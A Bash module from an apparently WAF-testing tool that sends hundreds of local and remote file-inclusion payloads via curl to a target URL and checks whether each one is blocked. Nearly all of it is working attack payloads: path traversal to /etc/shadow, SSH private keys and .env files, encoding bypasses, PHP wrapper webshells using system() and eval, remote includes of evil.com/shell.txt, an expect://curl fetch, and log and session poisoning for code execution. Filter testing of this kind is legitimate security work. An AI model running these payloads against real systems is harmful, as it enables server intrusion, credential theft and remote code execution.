#!/bin/bash
#==============================================================================
# LFI/RFI Tester - Script especializado em testes de File Inclusion
# Versão: 1.0.0
# Descrição: Script modular para testes de LFI/RFI usando payloads do PayloadsAllTheThings
#==============================================================================

# Importar cores e variáveis (se chamado diretamente)
if [ -z "$RED" ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    CYAN='\033[0;36m'
    MAGENTA='\033[0;35m'
    BOLD='\033[1m'
    NC='\033[0m'
fi

# Diretório base do script
LFI_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LFI_PAYLOADS_DIR="${LFI_SCRIPT_DIR}/PayloadsAllTheThings/File Inclusion"
LFI_INTRUDER_DIR="${LFI_PAYLOADS_DIR}/Intruders"

#==============================================================================
# FUNÇÕES AUXILIARES
#==============================================================================

lfi_print_section() {
    local title="$1"
    local shortcut="$2"
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ -n "$shortcut" ]; then
        echo -e "${BOLD}${MAGENTA}$title ${CYAN}($shortcut)${NC}"
    else
        echo -e "${BOLD}${MAGENTA}$title${NC}"
    fi
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

lfi_print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TESTES LFI BÁSICO - Path Traversal básico
#==============================================================================
test_lfi_basic() {
    lfi_print_subsection "Local File Inclusion Básico (30 variações)"
    
    # Basic path traversal
    test_curl "LFI Basic: ../../../etc/passwd" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd"
    test_curl "LFI Basic: ../../../../etc/passwd" "block" -A "$UA" -Lk "${URL}?page=../../../../etc/passwd"
    test_curl "LFI Basic: ../../../../../etc/passwd" "block" -A "$UA" -Lk "${URL}?page=../../../../../etc/passwd"
    test_curl "LFI Basic: ../../../../../../etc/passwd" "block" -A "$UA" -Lk "${URL}?page=../../../../../../etc/passwd"
    test_curl "LFI Basic: ../../../../../../../etc/passwd" "block" -A "$UA" -Lk "${URL}?page=../../../../../../../etc/passwd"
    
    # Linux sensitive files
    test_curl "LFI Basic: /etc/shadow" "block" -A "$UA" -Lk "${URL}?page=../../../etc/shadow"
    test_curl "LFI Basic: /etc/hosts" "block" -A "$UA" -Lk "${URL}?page=../../../etc/hosts"
    test_curl "LFI Basic: /etc/hostname" "block" -A "$UA" -Lk "${URL}?page=../../../etc/hostname"
    test_curl "LFI Basic: /etc/group" "block" -A "$UA" -Lk "${URL}?page=../../../etc/group"
    test_curl "LFI Basic: /etc/issue" "block" -A "$UA" -Lk "${URL}?page=../../../etc/issue"
    
    # System files
    test_curl "LFI Basic: /proc/self/environ" "block" -A "$UA" -Lk "${URL}?page=../../../proc/self/environ"
    test_curl "LFI Basic: /proc/version" "block" -A "$UA" -Lk "${URL}?page=../../../proc/version"
    test_curl "LFI Basic: /proc/cmdline" "block" -A "$UA" -Lk "${URL}?page=../../../proc/cmdline"
    
    # Web application files
    test_curl "LFI Basic: /var/log/apache2/access.log" "block" -A "$UA" -Lk "${URL}?page=../../../var/log/apache2/access.log"
    test_curl "LFI Basic: /var/log/nginx/access.log" "block" -A "$UA" -Lk "${URL}?page=../../../var/log/nginx/access.log"
    test_curl "LFI Basic: /var/log/apache2/error.log" "block" -A "$UA" -Lk "${URL}?page=../../../var/log/apache2/error.log"
    
    # Config files
    test_curl "LFI Basic: /etc/apache2/apache2.conf" "block" -A "$UA" -Lk "${URL}?page=../../../etc/apache2/apache2.conf"
    test_curl "LFI Basic: /etc/nginx/nginx.conf" "block" -A "$UA" -Lk "${URL}?page=../../../etc/nginx/nginx.conf"
    test_curl "LFI Basic: /etc/mysql/my.cnf" "block" -A "$UA" -Lk "${URL}?page=../../../etc/mysql/my.cnf"
    
    # Windows files
    test_curl "LFI Basic Windows: C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts" "block" -A "$UA" -Lk "${URL}?page=C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\drivers\\\\\\\\etc\\\\\\\\hosts"
    test_curl "LFI Basic Windows: C:\\\\boot.ini" "block" -A "$UA" -Lk "${URL}?page=C:\\\\\\\\boot.ini"
    test_curl "LFI Basic Windows: C:\\\\Windows\\\\win.ini" "block" -A "$UA" -Lk "${URL}?page=C:\\\\\\\\Windows\\\\\\\\win.ini"
    
    # Absolute paths
    test_curl "LFI Basic: /etc/passwd (absolute)" "block" -A "$UA" -Lk "${URL}?page=/etc/passwd"
    test_curl "LFI Basic: /etc/shadow (absolute)" "block" -A "$UA" -Lk "${URL}?page=/etc/shadow"
    
    # Double traversal
    test_curl "LFI Basic: ../../etc/passwd" "block" -A "$UA" -Lk "${URL}?page=../../etc/passwd"
    test_curl "LFI Basic: ../etc/passwd" "block" -A "$UA" -Lk "${URL}?page=../etc/passwd"
    
    # File parameter variations
    test_curl "LFI Basic: file param" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd"
    test_curl "LFI Basic: path param" "block" -A "$UA" -Lk "${URL}?path=../../../etc/passwd"
    test_curl "LFI Basic: include param" "block" -A "$UA" -Lk "${URL}?include=../../../etc/passwd"
    test_curl "LFI Basic: document param" "block" -A "$UA" -Lk "${URL}?document=../../../etc/passwd"
}

#==============================================================================
# TESTES LFI BYPASS - Técnicas de evasão
#==============================================================================
test_lfi_bypass() {
    lfi_print_subsection "LFI Filter Bypass (50 variações)"
    
    # Null byte (PHP < 5.3.4)
    test_curl "LFI Bypass: Null byte %00" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd%00"
    test_curl "LFI Bypass: Null byte .jpg" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd%00.jpg"
    test_curl "LFI Bypass: Null byte .png" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd%00.png"
    
    # Double encoding
    test_curl "LFI Bypass: Double encode ../" "block" -A "$UA" -Lk "${URL}?page=%252e%252e%252fetc%252fpasswd"
    test_curl "LFI Bypass: Double encode full" "block" -A "$UA" -Lk "${URL}?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    test_curl "LFI Bypass: Double encode + null" "block" -A "$UA" -Lk "${URL}?page=%252e%252e%252fetc%252fpasswd%2500"
    
    # UTF-8 encoding
    test_curl "LFI Bypass: UTF-8 ../" "block" -A "$UA" -Lk "${URL}?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
    test_curl "LFI Bypass: UTF-8 + null" "block" -A "$UA" -Lk "${URL}?page=%c0%ae%c0%ae/etc/passwd%00"
    
    # Filter bypass - dot removal
    test_curl "LFI Bypass: ....// bypass" "block" -A "$UA" -Lk "${URL}?page=....//....//etc/passwd"
    test_curl "LFI Bypass: ....//" "block" -A "$UA" -Lk "${URL}?page=....//../....//../....//etc/passwd"
    test_curl "LFI Bypass: Multiple slashes" "block" -A "$UA" -Lk "${URL}?page=..///////..////..//////etc/passwd"
    
    # Backslash bypass
    test_curl "LFI Bypass: Backslash ..\\\\" "block" -A "$UA" -Lk "${URL}?page=..\\\\..\\\\..\\\\etc/passwd"
    test_curl "LFI Bypass: Mixed slash" "block" -A "$UA" -Lk "${URL}?page=../..\\\\../etc/passwd"
    test_curl "LFI Bypass: Windows backslash" "block" -A "$UA" -Lk "${URL}?page=/%5C../%5C../%5C../%5C../%5C../etc/passwd"
    
    # Path truncation (PHP)
    test_curl "LFI Bypass: Path truncation dots" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd................................................................................................................................................................................"
    test_curl "LFI Bypass: Path truncation slashes" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././"
    
    # Encoding variations
    test_curl "LFI Bypass: URL encode ../" "block" -A "$UA" -Lk "${URL}?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    test_curl "LFI Bypass: URL encode +" "block" -A "$UA" -Lk "${URL}?page=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    
    # Dot-dot-slash variations
    test_curl "LFI Bypass: ..;/" "block" -A "$UA" -Lk "${URL}?page=..;/..;/..;/etc/passwd"
    test_curl "LFI Bypass: ..\\./" "block" -A "$UA" -Lk "${URL}?page=..\\\\./..\\\\./..\\\\./etc/passwd"
    
    # Case bypass (Windows)
    test_curl "LFI Bypass: Mixed case" "block" -A "$UA" -Lk "${URL}?page=../../../EtC/PaSsWd"
    test_curl "LFI Bypass: Uppercase" "block" -A "$UA" -Lk "${URL}?page=../../../ETC/PASSWD"
    
    # Question mark bypass
    test_curl "LFI Bypass: ? bypass" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd?"
    test_curl "LFI Bypass: ?. bypass" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd?."
    
    # Extension bypass
    test_curl "LFI Bypass: No extension" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd."
    test_curl "LFI Bypass: /. append" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd/."
    test_curl "LFI Bypass: //. append" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd//."
    
    # Unicode bypass
    test_curl "LFI Bypass: Unicode dot" "block" -A "$UA" -Lk "${URL}?page=%u002e%u002e%u002f%u002e%u002e%u002fetc/passwd"
    
    # Overlong UTF-8
    test_curl "LFI Bypass: Overlong UTF-8" "block" -A "$UA" -Lk "${URL}?page=%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd"
    
    # Percent bypass
    test_curl "LFI Bypass: %%32%65" "block" -A "$UA" -Lk "${URL}?page=%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
    
    # Using ..././ (bypass strip)
    test_curl "LFI Bypass: ..././" "block" -A "$UA" -Lk "${URL}?page=..././..././..././etc/passwd"
    test_curl "LFI Bypass: .../.../.../" "block" -A "$UA" -Lk "${URL}?page=.../.../.../.../etc/passwd"
    
    # Absolute + double encoding
    test_curl "LFI Bypass: Absolute encoded" "block" -A "$UA" -Lk "${URL}?page=%2Fetc%2Fpasswd"
    
    # Zip wrapper bypass
    test_curl "LFI Bypass: zip:// wrapper" "block" -A "$UA" -Lk "${URL}?page=zip://path/to/file.zip%23file.txt"
    
    # Data wrapper
    test_curl "LFI Bypass: data:// wrapper" "block" -A "$UA" -Lk "${URL}?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
    
    # Input wrapper
    test_curl "LFI Bypass: php://input" "block" -A "$UA" -Lk "${URL}?page=php://input" -d "<?php system('id'); ?>"
    
    # Filter wrapper
    test_curl "LFI Bypass: php://filter base64" "block" -A "$UA" -Lk "${URL}?page=php://filter/convert.base64-encode/resource=../../../etc/passwd"
    test_curl "LFI Bypass: php://filter rot13" "block" -A "$UA" -Lk "${URL}?page=php://filter/read=string.rot13/resource=../../../etc/passwd"
    
    # Expect wrapper
    test_curl "LFI Bypass: expect:// wrapper" "block" -A "$UA" -Lk "${URL}?page=expect://id"
    
    # SMB/UNC path (Windows)
    test_curl "LFI Bypass: UNC path" "block" -A "$UA" -Lk "${URL}?page=\\\\\\\\evil.com\\\\share\\\\file.php"
    
    # Mixed techniques
    test_curl "LFI Bypass: Multi 1" "block" -A "$UA" -Lk "${URL}?page=....//....//....//etc/passwd%00"
    test_curl "LFI Bypass: Multi 2" "block" -A "$UA" -Lk "${URL}?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd%2500"
    test_curl "LFI Bypass: Multi 3" "block" -A "$UA" -Lk "${URL}?page=..\\\\../..\\\\../etc/passwd%00.jpg"
    
    # Session file inclusion
    test_curl "LFI Bypass: Session file" "block" -A "$UA" -Lk "${URL}?page=../../../var/lib/php/sessions/sess_PHPSESSID"
    test_curl "LFI Bypass: Session tmp" "block" -A "$UA" -Lk "${URL}?page=../../../tmp/sess_PHPSESSID"
}

#==============================================================================
# TESTES LFI PHP WRAPPERS - Wrappers específicos do PHP
#==============================================================================
test_lfi_php_wrappers() {
    lfi_print_subsection "LFI PHP Wrappers (25 variações)"
    
    # php://filter wrappers
    test_curl "LFI Wrapper: filter base64-encode" "block" -A "$UA" -Lk "${URL}?page=php://filter/convert.base64-encode/resource=index.php"
    test_curl "LFI Wrapper: filter base64-decode" "block" -A "$UA" -Lk "${URL}?page=php://filter/convert.base64-decode/resource=index.php"
    test_curl "LFI Wrapper: filter rot13" "block" -A "$UA" -Lk "${URL}?page=php://filter/read=string.rot13/resource=index.php"
    test_curl "LFI Wrapper: filter toupper" "block" -A "$UA" -Lk "${URL}?page=php://filter/read=string.toupper/resource=index.php"
    test_curl "LFI Wrapper: filter tolower" "block" -A "$UA" -Lk "${URL}?page=php://filter/read=string.tolower/resource=index.php"
    
    # Multiple chained filters
    test_curl "LFI Wrapper: chain filters" "block" -A "$UA" -Lk "${URL}?page=php://filter/convert.base64-encode/convert.base64-decode/resource=index.php"
    test_curl "LFI Wrapper: chain rot13+base64" "block" -A "$UA" -Lk "${URL}?page=php://filter/read=string.rot13/convert.base64-encode/resource=index.php"
    
    # php://input for RCE
    test_curl "LFI Wrapper: php://input POST" "block" -A "$UA" -Lk "${URL}?page=php://input" -d "<?php system('whoami'); ?>"
    test_curl "LFI Wrapper: php://input eval" "block" -A "$UA" -Lk "${URL}?page=php://input" -d "<?php eval(\\\$_POST['cmd']); ?>"
    
    # data:// wrapper for RCE
    test_curl "LFI Wrapper: data:// phpinfo" "block" -A "$UA" -Lk "${URL}?page=data://text/plain,<?php%20phpinfo();%20?>"
    test_curl "LFI Wrapper: data:// system" "block" -A "$UA" -Lk "${URL}?page=data://text/plain,<?php%20system(\\\$_GET['cmd']);%20?>"
    test_curl "LFI Wrapper: data:// base64" "block" -A "$UA" -Lk "${URL}?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
    
    # expect:// wrapper
    test_curl "LFI Wrapper: expect id" "block" -A "$UA" -Lk "${URL}?page=expect://id"
    test_curl "LFI Wrapper: expect whoami" "block" -A "$UA" -Lk "${URL}?page=expect://whoami"
    test_curl "LFI Wrapper: expect ls" "block" -A "$UA" -Lk "${URL}?page=expect://ls"
    
    # zip:// wrapper
    test_curl "LFI Wrapper: zip file" "block" -A "$UA" -Lk "${URL}?page=zip://uploads/file.zip%23shell.php"
    
    # phar:// wrapper
    test_curl "LFI Wrapper: phar file" "block" -A "$UA" -Lk "${URL}?page=phar://uploads/file.phar/shell.php"
    
    # ftp:// wrapper
    test_curl "LFI Wrapper: ftp://" "block" -A "$UA" -Lk "${URL}?page=ftp://evil.com/shell.txt"
    
    # http:// wrapper
    test_curl "LFI Wrapper: http://" "block" -A "$UA" -Lk "${URL}?page=http://evil.com/shell.txt"
    
    # https:// wrapper
    test_curl "LFI Wrapper: https://" "block" -A "$UA" -Lk "${URL}?page=https://evil.com/shell.txt"
    
    # compress.zlib wrapper
    test_curl "LFI Wrapper: compress.zlib" "block" -A "$UA" -Lk "${URL}?page=compress.zlib://index.php"
    
    # compress.bzip2 wrapper
    test_curl "LFI Wrapper: compress.bzip2" "block" -A "$UA" -Lk "${URL}?page=compress.bzip2://index.php"
    
    # glob:// wrapper
    test_curl "LFI Wrapper: glob://" "block" -A "$UA" -Lk "${URL}?page=glob:///*"
    
    # iconv wrapper
    test_curl "LFI Wrapper: iconv" "block" -A "$UA" -Lk "${URL}?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php"
}

#==============================================================================
# TESTES RFI - Remote File Inclusion
#==============================================================================
test_rfi_basic() {
    lfi_print_subsection "Remote File Inclusion (20 variações)"
    
    local evil_domain="evil.com"
    
    # Basic RFI
    test_curl "RFI Basic: http://" "block" -A "$UA" -Lk "${URL}?page=http://${evil_domain}/shell.txt"
    test_curl "RFI Basic: http:// .php" "block" -A "$UA" -Lk "${URL}?page=http://${evil_domain}/shell.php"
    test_curl "RFI Basic: https://" "block" -A "$UA" -Lk "${URL}?page=https://${evil_domain}/shell.txt"
    
    # RFI with null byte
    test_curl "RFI Bypass: Null byte" "block" -A "$UA" -Lk "${URL}?page=http://${evil_domain}/shell.txt%00"
    test_curl "RFI Bypass: Null + .jpg" "block" -A "$UA" -Lk "${URL}?page=http://${evil_domain}/shell.txt%00.jpg"
    
    # RFI with double encoding
    test_curl "RFI Bypass: Double encode" "block" -A "$UA" -Lk "${URL}?page=http:%252f%252f${evil_domain}%252fshell.txt"
    
    # RFI with question mark
    test_curl "RFI Bypass: ? bypass" "block" -A "$UA" -Lk "${URL}?page=http://${evil_domain}/shell.txt?"
    test_curl "RFI Bypass: ?# bypass" "block" -A "$UA" -Lk "${URL}?page=http://${evil_domain}/shell.txt?#"
    
    # RFI via SMB (Windows)
    test_curl "RFI SMB: UNC path" "block" -A "$UA" -Lk "${URL}?page=\\\\\\\\${evil_domain}\\\\share\\\\shell.php"
    test_curl "RFI SMB: UNC IP" "block" -A "$UA" -Lk "${URL}?page=\\\\\\\\10.10.10.10\\\\share\\\\shell.php"
    
    # RFI via FTP
    test_curl "RFI FTP: ftp://" "block" -A "$UA" -Lk "${URL}?page=ftp://${evil_domain}/shell.txt"
    test_curl "RFI FTP: with creds" "block" -A "$UA" -Lk "${URL}?page=ftp://user:pass@${evil_domain}/shell.txt"
    
    # RFI with data wrapper
    test_curl "RFI data: text/plain" "block" -A "$UA" -Lk "${URL}?page=data:text/plain,<?php%20system(\\\$_GET['c']);?>"
    test_curl "RFI data: base64" "block" -A "$UA" -Lk "${URL}?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
    
    # RFI via expect
    test_curl "RFI expect: curl" "block" -A "$UA" -Lk "${URL}?page=expect://curl%20http://${evil_domain}/shell.txt"
    
    # RFI with different ports
    test_curl "RFI Port: 8080" "block" -A "$UA" -Lk "${URL}?page=http://${evil_domain}:8080/shell.txt"
    test_curl "RFI Port: 443" "block" -A "$UA" -Lk "${URL}?page=https://${evil_domain}:443/shell.txt"
    
    # RFI with IP
    test_curl "RFI IP: 10.10.10.10" "block" -A "$UA" -Lk "${URL}?page=http://10.10.10.10/shell.txt"
    
    # RFI bypass filters
    test_curl "RFI Bypass: URL encoding" "block" -A "$UA" -Lk "${URL}?page=http%3A%2F%2F${evil_domain}%2Fshell.txt"
    test_curl "RFI Bypass: Mixed encoding" "block" -A "$UA" -Lk "${URL}?page=http://${evil_domain}%2Fshell.txt"
}

#==============================================================================
# TESTES LFI TO RCE - Log poisoning e outras técnicas
#==============================================================================
test_lfi_to_rce() {
    lfi_print_subsection "LFI to RCE (15 variações)"
    
    # Log poisoning - Apache
    test_curl "LFI2RCE: Apache access.log" "block" -A "<?php system(\\\$_GET['c']); ?>" -Lk "${URL}?page=../../../var/log/apache2/access.log&c=id"
    test_curl "LFI2RCE: Apache error.log" "block" -A "<?php system(\\\$_GET['c']); ?>" -Lk "${URL}?page=../../../var/log/apache2/error.log&c=id"
    
    # Log poisoning - Nginx
    test_curl "LFI2RCE: Nginx access.log" "block" -A "<?php system(\\\$_GET['c']); ?>" -Lk "${URL}?page=../../../var/log/nginx/access.log&c=id"
    test_curl "LFI2RCE: Nginx error.log" "block" -A "<?php system(\\\$_GET['c']); ?>" -Lk "${URL}?page=../../../var/log/nginx/error.log&c=id"
    
    # Session poisoning
    test_curl "LFI2RCE: Session file" "block" -A "$UA" -Lk "${URL}?page=../../../var/lib/php/sessions/sess_attacker" --cookie "PHPSESSID=attacker;data=<?php system('id');?>"
    
    # /proc/self/environ poisoning
    test_curl "LFI2RCE: /proc/self/environ" "block" -A "<?php system('id'); ?>" -Lk "${URL}?page=../../../proc/self/environ"
    
    # Mail log poisoning
    test_curl "LFI2RCE: mail.log" "block" -A "$UA" -Lk "${URL}?page=../../../var/log/mail.log"
    
    # SSH log poisoning
    test_curl "LFI2RCE: auth.log" "block" -A "$UA" -Lk "${URL}?page=../../../var/log/auth.log"
    
    # FTP log poisoning
    test_curl "LFI2RCE: vsftpd.log" "block" -A "$UA" -Lk "${URL}?page=../../../var/log/vsftpd.log"
    
    # Upload temp files
    test_curl "LFI2RCE: PHP temp" "block" -A "$UA" -Lk "${URL}?page=../../../tmp/phpXXXXXX"
    test_curl "LFI2RCE: Upload tmp" "block" -A "$UA" -Lk "${URL}?page=../../../var/tmp/upload_XXXXXX"
    
    # /proc/self/fd
    test_curl "LFI2RCE: /proc/self/fd/0" "block" -A "$UA" -Lk "${URL}?page=../../../proc/self/fd/0"
    test_curl "LFI2RCE: /proc/self/fd/1" "block" -A "$UA" -Lk "${URL}?page=../../../proc/self/fd/1"
    
    # Pearcmd (PHP PEAR)
    test_curl "LFI2RCE: pearcmd" "block" -A "$UA" -Lk "${URL}?page=../../../usr/local/lib/php/pearcmd.php&+config-create+/&/<?=\\\`\\\$_GET[0]\\\`?>+/tmp/exec.php"
    
    # Via /proc/self/cmdline
    test_curl "LFI2RCE: cmdline" "block" -A "$UA" -Lk "${URL}?page=../../../proc/self/cmdline"
}

#==============================================================================
# TESTES LFI FROM INTRUDERS - Payloads das listas
#==============================================================================
test_lfi_from_intruders() {
    lfi_print_subsection "LFI Payloads Avançados (50 da lista)"
    
    local intruder_file="${LFI_INTRUDER_DIR}/Linux-files.txt"
    
    if [ ! -f "$intruder_file" ]; then
        echo -e "${YELLOW}  ⚠ Arquivo de payloads não encontrado: $intruder_file${NC}"
        # Try alternative file
        intruder_file="${LFI_INTRUDER_DIR}/simple-check.txt"
    fi
    
    if [ ! -f "$intruder_file" ]; then
        echo -e "${YELLOW}  ⚠ Arquivo de payloads não encontrado${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r payload || [ -n "$payload" ]; do
        [ -z "$payload" ] && continue
        [ "${payload:0:1}" == "#" ] && continue
        
        count=$((count + 1))
        
        # URL encode o payload
        local encoded_payload=$(echo -n "$payload" | jq -sRr @uri 2>/dev/null || echo "$payload")
        test_curl "LFI Advanced #$count: ${payload:0:40}..." "block" -A "$UA" -Lk "${URL}?page=${encoded_payload}"
        
        [ $count -ge 50 ] && break
    done < "$intruder_file"
    
    echo -e "\n  ${CYAN}Total de payloads avançados testados: $count${NC}"
}

#==============================================================================
# TESTES LFI PATH TRAVERSAL - Variações profundas
#==============================================================================
test_lfi_path_traversal() {
    lfi_print_subsection "Path Traversal Deep (20 variações)"
    
    # Deep traversal
    test_curl "LFI Traversal: 10 levels" "block" -A "$UA" -Lk "${URL}?page=../../../../../../../../../etc/passwd"
    test_curl "LFI Traversal: 15 levels" "block" -A "$UA" -Lk "${URL}?page=../../../../../../../../../../../../../../etc/passwd"
    test_curl "LFI Traversal: 20 levels" "block" -A "$UA" -Lk "${URL}?page=../../../../../../../../../../../../../../../../../../../etc/passwd"
    
    # Windows deep traversal
    test_curl "LFI Traversal Win: 10 levels" "block" -A "$UA" -Lk "${URL}?page=..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts"
    
    # Traversal with file at different depths
    test_curl "LFI Traversal: var/www" "block" -A "$UA" -Lk "${URL}?page=../../var/www/html/index.php"
    test_curl "LFI Traversal: home user" "block" -A "$UA" -Lk "${URL}?page=../../../../home/user/.ssh/id_rsa"
    test_curl "LFI Traversal: root" "block" -A "$UA" -Lk "${URL}?page=../../../../../root/.ssh/id_rsa"
    
    # Combination with current dir
    test_curl "LFI Traversal: ./" "block" -A "$UA" -Lk "${URL}?page=./../../etc/passwd"
    test_curl "LFI Traversal: ./.." "block" -A "$UA" -Lk "${URL}?page=./../../../etc/passwd"
    
    # Absolute paths variations
    test_curl "LFI Traversal: //etc" "block" -A "$UA" -Lk "${URL}?page=//etc/passwd"
    test_curl "LFI Traversal: ///etc" "block" -A "$UA" -Lk "${URL}?page=///etc/passwd"
    
    # Traversal to web root
    test_curl "LFI Traversal: config.php" "block" -A "$UA" -Lk "${URL}?page=../config.php"
    test_curl "LFI Traversal: wp-config" "block" -A "$UA" -Lk "${URL}?page=../wp-config.php"
    test_curl "LFI Traversal: .env" "block" -A "$UA" -Lk "${URL}?page=../.env"
    test_curl "LFI Traversal: .htaccess" "block" -A "$UA" -Lk "${URL}?page=../.htaccess"
    
    # Traversal to common locations
    test_curl "LFI Traversal: /opt" "block" -A "$UA" -Lk "${URL}?page=../../../opt/config"
    test_curl "LFI Traversal: /usr/local" "block" -A "$UA" -Lk "${URL}?page=../../../../usr/local/etc/config"
    
    # Same directory
    test_curl "LFI Traversal: Current dir" "block" -A "$UA" -Lk "${URL}?page=./index.php"
    test_curl "LFI Traversal: Parent index" "block" -A "$UA" -Lk "${URL}?page=../index.php"
    
    # Combo traversal + bypass
    test_curl "LFI Combo: Traversal + null" "block" -A "$UA" -Lk "${URL}?page=../../../etc/passwd%00"
}

#==============================================================================
# FUNÇÃO PRINCIPAL - Executa todos os testes LFI/RFI
#==============================================================================
run_all_lfi_rfi_tests() {
    lfi_print_section "📁 TESTES COMPLETOS DE FILE INCLUSION (PayloadsAllTheThings)" "-c lfi"
    
    echo -e "${CYAN}ℹ️  Usando payloads do PayloadsAllTheThings/File Inclusion${NC}"
    echo -e "${CYAN}ℹ️  Total estimado: 250+ testes de LFI/RFI${NC}"
    echo ""
    
    test_lfi_basic
    test_lfi_bypass
    test_lfi_php_wrappers
    test_rfi_basic
    test_lfi_to_rce
    test_lfi_path_traversal
    test_lfi_from_intruders
    
    echo ""
    echo -e "${GREEN}✓ Todos os testes File Inclusion foram concluídos!${NC}"
}

# Se o script for executado diretamente (não como source)
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    echo -e "${RED}❌ Este script deve ser chamado pelo head-test.sh${NC}"
    echo -e "${YELLOW}Use: ./head-test.sh -u URL -c lfi${NC}"
    exit 1
fi
